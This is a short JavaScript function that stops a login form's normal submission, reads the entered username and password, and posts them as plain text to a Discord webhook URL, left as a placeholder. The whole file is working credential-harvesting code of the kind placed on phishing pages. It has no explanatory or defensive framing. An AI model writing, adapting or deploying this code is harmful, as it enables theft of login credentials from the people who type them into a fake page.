function sendLoginData(event) {
  event.preventDefault(); // Prevent the form from submitting normally

  const form = event.target;
  const username = form.username.value;
  const password = form.password.value;

  const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";

  const payload = {
    content: `Username: ${username}\nPassword: ${password}`,
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  })
    .then(response => {
      if (response.ok) {
        // Successful webhook request
        // You can perform additional actions or display a success message
      } else {
        // Error in the webhook request
        // You can handle the error or display an error message
      }
    })
    .catch(error => {
      // Error in the fetch request
      // You can handle the error or display an error message
    });
}
